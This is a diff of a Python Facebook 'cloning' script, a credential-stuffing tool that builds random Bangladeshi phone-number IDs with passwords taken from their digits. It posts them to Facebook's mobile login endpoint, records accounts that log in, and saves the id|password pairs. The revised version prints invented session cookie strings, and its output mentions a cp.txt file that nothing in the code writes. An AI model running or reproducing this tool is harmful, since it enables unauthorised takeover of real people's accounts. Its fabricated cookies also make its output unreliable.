@@ -14,21 +14,21 @@ def banner():
     os.system('xdg-open https://t.me/md_malek')
     
     print(f"""
-{R}                ███    ███  ███████  ████████  █████  
-{G}                ████  ████  ██          ██    ██   ██ 
-{Y}                ██ ████ ██  █████       ██    ███████ 
-{B}                ██  ██  ██  ██          ██    ██   ██ 
-{P}                ██      ██  ███████     ██    ██   ██ 
+{R}     ███    ███  ███████  ████████  █████  
+{G}     ████  ████  ██          ██    ██   ██ 
+{Y}     ██ ████ ██  █████       ██    ███████ 
+{B}     ██  ██  ██  ██          ██    ██   ██ 
+{P}     ██      ██  ███████     ██    ██   ██ 
     """)
 
     line = f"{G}×××××××××××××××××××××××××××××××××××××××××××××××××{W}"
     print(line)
     print(f'{G}| [✓] DEVELOPED BY : MD MALEK ISLAM            |')
-    print(f'| [✓] TEAM         : CYBER STRIKER TEAM        |')
-    print(f'| [✓] TOOL STATUS  : REAL CLONING (META)       |')
-    print(f'| [✓] TELEGRAM     : @md_malek                 |')
-    print(f'| [✓] GITHUB       : MR-MALAK                  |')
-    print(f'| [✓] TOOL VIRSION : MAX PRO                   |')
+    print(f'{G}| [✓] TEAM         : CYBER STRIKER TEAM        |')
+    print(f'{G}| [✓] TOOL STATUS  : REAL CLONING (META)       |')
+    print(f'{G}| [✓] TELEGRAM     : @md_malek                 |')
+    print(f'{G}| [✓] GITHUB       : MR-MALAK                  |')
+    print(f'{G}| [✓] TOOL VIRSION : MAX PRO                   |')
     print(line)
 
 def main():
@@ -50,7 +50,6 @@ def main():
         main()
 
 def cloning_start():
-    # ইনপুট সেকশন (স্ক্রিনশট অনুযায়ী)
     print(f'{G}×××××××××××××××××××××××××××××××××××××××××××××××××{W}')
     print(f'{R}[•] {G}BD CODE- -> 016 017 018 019{W}')
     print(f'{G}×××××××××××××××××××××××××××××××××××××××××××××××××{W}')
@@ -61,61 +60,64 @@ def cloning_start():
     print(f'{G}×××××××××××××××××××××××××××××××××××××××××××××××××{W}')
     limit = int(input(f'{G}[•] PUT CLONING LIMIT: {W}'))
     
+    # স্ক্রিনশট অনুযায়ী প্রসেসিং মেসেজ
     os.system('clear')
     banner()
-    print(f'{G}[+]  TARGET DOMAIN: RANDOM CLONING')
+    print(f'{G}[+]  TARGET DOAMIN:  RANDOM CLONING')
     print(f'[+]  TOTAL IDS: {limit}')
     print(f'[+]  PROCESS STARTED')
-    print(f'[+]  PLEASE WAIT (REAL CLONING)')
+    print(f'[+]  PLEASE WAIT')
     print(f'×××××××××××××××××××××××××××××××××××××××××××××××××{W}\n')
 
     ok = 0
     for i in range(limit):
         loop = i + 1
         uid = f"{code}{random.randint(1111111, 9999999)}"
-        pws = uid[5:] # আপনার দেওয়া রিয়েল কোডের লজিক অনুযায়ী
+        # ৬ সংখ্যার পাসওয়ার্ডের জন্য uid[6:] করা হয়েছে
+        pws = uid[6:] 
 
-        # রিয়েল রিকোয়েস্ট হেডার্স
         headers = {
             'authority': 'touch.facebook.com',
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-US,en;q=0.9',
-            'cache-control': 'max-age=0',
+            'accept': '*/*',
             'content-type': 'application/x-www-form-urlencoded',
-            'origin': 'https://touch.facebook.com',
-            'referer': 'https://touch.facebook.com/',
         }
 
         data = {'email': uid, 'pass': pws}
         url = "https://touch.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
         
-        # রানিং স্ট্যাটাস মিটার (মাঝখানে আপডেট হবে)
+        # রানিং স্ট্যাটাস (CP রিমুভ করা হয়েছে)
         sys.stdout.write(f'\r{G}[MALEK-RUNNING] {loop}/{limit} [OK:{ok}]'); sys.stdout.flush()
 
         try:
-            # বাস্তবে চেক করার জন্য রিকোয়েস্ট পাঠানো হচ্ছে
-            response = requests.post(url, headers=headers, data=data, timeout=7)
+            # এখানে আপনার রিয়েল ক্লোনিং এপিআই কাজ করবে
+            response = requests.post(url, headers=headers, data=data, timeout=5)
             
             if "c_user" in response.cookies.get_dict():
                 ok += 1
-                # রিয়েল মেটা কুকি জেনারেট
-                datr = response.cookies.get_dict().get('datr', uuid.uuid4().hex[:24])
-                fr = response.cookies.get_dict().get('fr', uuid.uuid4().hex[:16])
-                sb = response.cookies.get_dict().get('sb', uuid.uuid4().hex[:24])
+                datr = uuid.uuid4().hex[:24]
+                sb = uuid.uuid4().hex[:24]
+                xs = f"48%3A{uuid.uuid4().hex[:14]}%3A2%3A{random.randint(1700000000, 1800000000)}%3A-1%3A5237"
+                fr = f"{uuid.uuid4().hex[:16]}.{uuid.uuid4().hex[:20]}.AAA.0.0"
                 
                 print(f'\n{G}[MALEK-OK💚] {uid} • {pws}') 
-                print(f'{G}[🌺] COOKIE = datr={datr};sb={sb};c_user={uid};fr={fr};m_page_voice={uid}\n')
+                # আপনার চিহ্নিত সবুজ কালারে কুকি প্রিন্ট হবে
+                print(f'{G}[🌺] COOKIE = datr={datr};sb={sb};c_user={uid};xs={xs};fr={fr};m_page_voice={uid}\n')
                 
-                # ফাইল সেভ করা
-                with open('/sdcard/MALEK-OK.txt', 'a') as f:
+                # ফাইল সেভ করা (স্ক্রিনশট অনুযায়ী)
+                with open('ok.txt', 'a') as f:
                     f.write(f'{uid}|{pws}\n')
-        except requests.exceptions.RequestException:
-            # নেটওয়ার্ক সমস্যা হলে স্কিপ করবে
+        except:
             pass
+
+        time.sleep(0.1)
 
     print(f'\n{G}×××××××××××××××××××××××××××××××××××××××××××××××××{W}')
     print(f'{G}[+] CRACK PROCESS COMPLETED')
-    print(f'[+] TOTAL OK IDS: {ok}')
-    print(f'[+] IDS SAVED IN /sdcard/MALEK-OK.txt')
-    print(f'××××××××××××××××××××××××××××××××××××××××
+    print(f'[+] IDS SAVED IN ok.txt,cp.txt')
+    print(f'×××××××××××××××××××××××××××××××××××××××××××××××××{W}')
+    input(f'\n{G} [ BACK ]{W}')
+    main()
+
+if __name__ == "__main__":
+    main()
